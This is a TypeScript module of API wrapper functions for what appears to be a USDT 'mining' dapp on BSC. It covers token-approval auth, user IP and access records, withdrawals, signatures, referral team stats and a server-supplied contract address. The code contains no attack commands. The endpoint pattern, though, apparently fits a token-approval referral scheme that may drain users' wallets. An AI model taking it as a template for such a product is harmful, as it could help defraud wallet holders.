import { fetcher } from "@/lib/fetcher"

export const postUserapproveAuth = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/home/auth",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}

export const postUserIp = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/home/user-record",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })

}

export const postUserAccessRecord = (data:any) =>{
    return fetcher({
        method:"POST",
        url:"api-bsc-usdt/access_record",
        headers:{
            ...data
        }
    })
}

export const getUserinfoServer = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/wallet/get-wallet-info",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}
export const getRequestExtract = (data: any) => {
    return fetcher({
        method: "POST",
        url: "home/mining-request",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}
export const getDepositLog = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/wallet/get-withdraw-records",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}
export const postUserWithoutExtract = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/wallet/withdraw-request",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}

//注册
export const postUseRregister = (data: any) => {
    return fetcher({
        method: "POST",
        url: "api/register",
        headers: {
            ...data
        }
    })
}

//签名
export const getSignData = (data:any) => {
    return fetcher({
        method: "POST",
        url: "api/signature",
        headers: {
            ...data
        }
    })
}

//获取收益信息
export const getIncome = (data:any) => {
    return fetcher({
        method: "POST",
        url: "api/info",
        headers: {
            ...data
        }
    })
}

//获取团队接口
export const getTeamInfo = (data:any) => {
    return fetcher({
        method: "POST",
        url: "api/vAddressList",
        headers: {
            ...data
        }
    })
}

//获取直推
export const getDirectPush = (data:any) => {
    return fetcher({
        method: "POST",
        url: "api/performance_value",
        headers: {
            ...data
        }
    })
}

//获取通知
export const getAuthNotic = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/home/get-notice",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}

//获取合约地址
export const getContractAddress = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/home/get-auth-address",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}

//检验地址哈希
export const getAddrHashDeposit = (data:any) => {
    return fetcher({
        method: "POST",
        url: "api-bsc-usdt/deposit_logs",
        headers: {
            ...data
        }
    })
}

//捕获授权error
export const addAuthError = (data:any)=>{
    return fetcher({
        method: "POST",
        url: "api-bsc-usdt/auth_err_log",
        headers: {
            ...data
        }
    }) 
}

//获取合约地址
export const getHomeConfig = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/home/get-setting",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}

//获取合约地址
export const getBackList = (data: any) => {
    return fetcher({
        method: "POST",
        url: "/home/blacklist",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        data:{
            ...data
        }
    })
}

